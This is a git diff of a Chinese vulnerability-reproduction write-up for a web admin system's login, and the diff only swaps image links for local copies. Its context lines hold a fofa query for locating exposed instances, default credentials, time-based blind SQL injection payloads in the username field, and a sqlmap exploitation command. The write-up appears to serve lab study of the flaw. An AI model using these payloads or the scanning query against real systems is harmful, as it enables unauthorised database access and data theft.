@@ -72,9 +72,9 @@ fofa: "body=\"url=\\\"admin.php?controller=admin_index&action=get_user_login_fri
 
 系统登陆界面大概有这几种
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbD6kn36Mmd9uqia7Abpc94zPlLgSPd42r95EtjgnY8HOHmmLAJ1dlUawQ/640?wx_fmt=png)
+![](../../.resource/remote/df960abe2adcfc409f7d706a45dd6942c18ebee686e29c0e6fac5ff51605cf30.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDfQUdHtkYKJvO0qrLl0sfKpIDpibX96FNFIicE8OTfh2QJ74AsR3Rkg2A/640?wx_fmt=png)
+![](../../.resource/remote/00d031c45864ac50a75e85ce887e6512d51228bcdd246105b2f9a9da911d850e.png)
 
 三、漏洞描述
 
@@ -126,17 +126,17 @@ netstat -atunlp |grep 2288
 
 浏览器访问：https://192.168.190.132
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDFOv3Q1VIa82laF1Lmagt5SC1MguBQW3ZG7qkqXp4DhlKW3JLRw4GXg/640?wx_fmt=png)
+![](../../.resource/remote/3959a820e73255d6f2751719005b56f9dbce7b80a69974154ff5448372d39823.png)
 
 注意：浏览器访问时会提示不安全，点击左下方的 “高级” 继续访问。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDfQUdHtkYKJvO0qrLl0sfKpIDpibX96FNFIicE8OTfh2QJ74AsR3Rkg2A/640?wx_fmt=png)
+![](../../.resource/remote/00d031c45864ac50a75e85ce887e6512d51228bcdd246105b2f9a9da911d850e.png)
 
 默认用户名：admin
 
 默认密码：12345678
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDnUzX7nFo4icGozsic2Zo78ksxdXdp22lRmHjzdeiabAGNkCTbX3icjo8gQ/640?wx_fmt=png)
+![](../../.resource/remote/0576b463ce1f363b11ce8153c699ddd0a53c4438de9285693b2156725cc5c4d6.png)
 
 ssh 连接，端口 2288，root 密码还是你系统的密码。
 
@@ -157,7 +157,7 @@ username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(5)))ptGN) AND 'AAdm'='AAdm
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDT1libag1yHxbJiaJymAj7u1pTibyvVz8TZiae3moJ6VDic3P7qIEPV6TWqA/640?wx_fmt=png)
+![](../../.resource/remote/fba1f64a55cf634420a3d7b3a11265832339ee2ea07d39080bbec4311225229c.png)
 
 向目标发送如下请求数据包，使响应延迟 15 秒
 
@@ -174,7 +174,7 @@ username=admin' AND (SELECT 12 FROM (SELECT(SLEEP(15)))ptGN) AND 'AAdm'='AAdm
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDVrr7Zia8zJfJ2ZvWHIs7Fv0dtro8TP53sicNiawTJNUHSHZKqWCicFuw4Q/640?wx_fmt=png)
+![](../../.resource/remote/10d2541dbf8cd3b5b4263dad9d5fe8a6d4cd1c866b2d7f7d3cb64783a45078ba.png)
 
 正常系统是在毫秒级响应，加上 SLEEP(5) 和 SLEEP(15) 之后响应时间分别为 5.064 秒和 15.134 秒证明存在 **sql 注入漏洞**
 
@@ -219,7 +219,7 @@ if __name__ == '__main__':
 
 在桌面新建文件 1.txt, 写入靶场地址，使用 jupyter 运行上述代码
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDMnDSzicMSUshsYl4cDIH0ib3CGIC2mgAfI49Qnn5lBr41TFSmG3Slt7w/640?wx_fmt=png)
+![](../../.resource/remote/ac849a963c3bdf6d1f14a6bcbf16e33fc2229ca64acb3875559f0a35818fcbe1.png)
 
 八、漏洞利用
 
@@ -230,7 +230,7 @@ sqlmap -u "https://ip:port/admin.php?controller=admin_commonuser" --data "user -
 
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/lloX2SgC3BON01jXxox3qYHkvEzqFDbDFnnamfyyA6Xm5RburJn2ibjvFY6qZY0x91DNDSkIW5OvrWexWCULyxQ/640?wx_fmt=png)
+![](../../.resource/remote/3208aa547ca1db6e137491e631e3d84541d8be39427d54826c15a656ff0689a8.png)
 
 ---
 
